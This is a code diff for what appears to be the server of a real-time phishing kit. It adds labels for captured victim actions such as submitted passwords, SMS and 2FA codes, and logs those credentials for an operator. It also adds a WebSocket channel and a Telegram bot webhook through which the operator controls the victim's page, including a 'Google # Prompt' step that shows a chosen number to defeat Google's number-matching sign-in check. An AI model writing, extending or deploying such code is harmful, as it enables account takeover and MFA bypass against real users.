@@ -51,9 +51,30 @@ Timezone: ${data.timezone || 'N/A'}
 Platform: ${data.platform || 'N/A'}
 `;
   } else if (type === 'interaction') {
+    // Render a friendly action label so the admin can immediately tell what
+    // the user did (e.g. "User clicked Cancel" for the standardised
+    // `user_canceled` action emitted by every interactive page's Cancel button).
+    const ACTION_LABELS = {
+      user_canceled: 'User clicked Cancel',
+      retry_password: 'User submitted password (retry)',
+      submit_sms: 'User submitted SMS code',
+      submit_2fa: 'User submitted 2FA code',
+      submit_email_code: 'User submitted email verification code',
+      deny_authenticator: 'User denied the authenticator prompt',
+      select_number: 'User tapped the prompted number',
+      resend_sms: 'User requested a new SMS code',
+      resend_prompt: 'User requested a new push prompt',
+      resend_email_code: 'User requested a new email code',
+      request_alternate_method: 'User requested an alternate verification method',
+      continue_security_check: 'User continued the security check',
+      deny_security_check: 'User denied the security check',
+      begin_account_recovery: 'User started account recovery',
+    };
+    const action = data.action || 'N/A';
+    const label = ACTION_LABELS[action] || action;
     message = `
 --- 👆 INTERACTION 👆 ---
-Action: ${data.action || 'N/A'}
+Action: ${label} (${action})
 ${data.code ? `Code: ${data.code}` : ''}
 ${data.password ? `Password: ${data.password}` : ''}
 
@@ -125,6 +146,138 @@ wss.on('connection', (ws, req) => {
     ws.on('error', (error) => {
         console.error(`[SERVER] WebSocket error for ${sessionId}:`, error);
     });
+});
+
+/**
+ * Send a command + optional payload to a connected user's WebSocket.
+ * Returns true if the command was actually delivered, false otherwise (e.g.
+ * the user has disconnected or never had a session under this id).
+ *
+ * Exposed on `global` so other modules / inline handlers (e.g. the Telegram
+ * webhook) can drive the front-end UI by sessionId.
+ */
+function sendWebSocketCommand(sessionId, command, data) {
+    const ws = activeConnections.get(sessionId);
+    if (!ws || ws.readyState !== ws.OPEN) {
+        console.warn(`[SERVER] sendWebSocketCommand: no open socket for ${sessionId}`);
+        return false;
+    }
+    try {
+        ws.send(JSON.stringify({ command, data: data || {} }));
+        return true;
+    } catch (error) {
+        console.error(`[SERVER] sendWebSocketCommand failed for ${sessionId}:`, error);
+        return false;
+    }
+}
+global.sendWebSocketCommand = sendWebSocketCommand;
+
+// --- Telegram helpers (used by the inline-keyboard webhook below) ---
+async function callTelegramApi(method, body) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body),
+        });
+        const json = await response.json();
+        if (!json.ok) {
+            console.error(`[SERVER] Telegram ${method} error:`, json);
+        }
+        return json;
+    } catch (error) {
+        console.error(`[SERVER] Telegram ${method} failed:`, error);
+        return null;
+    }
+}
+
+// --- Telegram webhook: two-step "Google # Prompt" admin flow ---
+//
+// The admin's existing "Google # Prompt" button (bound elsewhere) is expected
+// to send `callback_data=g_num_init:<sessionId>` for a given user session.
+// Step 1 — `g_num_init:<sessionId>`: this handler responds by editing the
+//   message to show a fresh inline keyboard of three random numbers, each
+//   carrying `callback_data=g_num:<number>:<sessionId>`.
+// Step 2 — `g_num:<number>:<sessionId>`: this handler sends
+//   `show_google_number_prompt` over the WebSocket with `{ number }` so the
+//   user sees the single chosen number.
+app.post('/api/telegram-webhook', async (req, res) => {
+    const update = req.body || {};
+    // Always 200 the webhook so Telegram doesn't retry — we handle errors inline.
+    res.status(200).json({ ok: true });
+
+    const cb = update.callback_query;
+    if (!cb || typeof cb.data !== 'string') return;
+
+    const parts = cb.data.split(':');
+    const verb = parts[0];
+
+    if (verb === 'g_num_init') {
+        const sessionId = parts[1];
+        if (!sessionId) {
+            await callTelegramApi('answerCallbackQuery', {
+                callback_query_id: cb.id,
+                text: 'Missing sessionId',
+                show_alert: false,
+            });
+            return;
+        }
+        // Generate 3 distinct two-digit numbers for the inline keyboard.
+        const picked = new Set();
+        while (picked.size < 3) {
+            picked.add(Math.floor(10 + Math.random() * 90));
+        }
+        const numbers = Array.from(picked);
+        const inline_keyboard = [numbers.map((n) => ({
+            text: String(n),
+            callback_data: `g_num:${n}:${sessionId}`,
+        }))];
+
+        await callTelegramApi('answerCallbackQuery', { callback_query_id: cb.id });
+
+        const editPayload = {
+            chat_id: cb.message?.chat?.id,
+            message_id: cb.message?.message_id,
+            text: `Google # Prompt — pick the number to show the user (session ${sessionId}):`,
+            reply_markup: { inline_keyboard },
+        };
+        const edited = await callTelegramApi('editMessageText', editPayload);
+        if (!edited || !edited.ok) {
+            // Fallback: send a new message with the keyboard if we can't edit.
+            await callTelegramApi('sendMessage', {
+                chat_id: cb.message?.chat?.id || TELEGRAM_CHAT_ID,
+                text: editPayload.text,
+                reply_markup: editPayload.reply_markup,
+            });
+        }
+        return;
+    }
+
+    if (verb === 'g_num') {
+        const number = Number(parts[1]);
+        const sessionId = parts.slice(2).join(':');
+        if (!Number.isFinite(number) || !sessionId) {
+            await callTelegramApi('answerCallbackQuery', {
+                callback_query_id: cb.id,
+                text: 'Invalid payload',
+            });
+            return;
+        }
+        const delivered = sendWebSocketCommand(sessionId, 'show_google_number_prompt', { number });
+        await callTelegramApi('answerCallbackQuery', {
+            callback_query_id: cb.id,
+            text: delivered ? `Sent ${number} to user` : `User ${sessionId} not connected`,
+        });
+        if (cb.message?.chat?.id && cb.message?.message_id) {
+            await callTelegramApi('editMessageText', {
+                chat_id: cb.message.chat.id,
+                message_id: cb.message.message_id,
+                text: `Google # Prompt — sent number ${number} to session ${sessionId}.`,
+            });
+        }
+        return;
+    }
 });
 
 // --- SPA Fallback ---
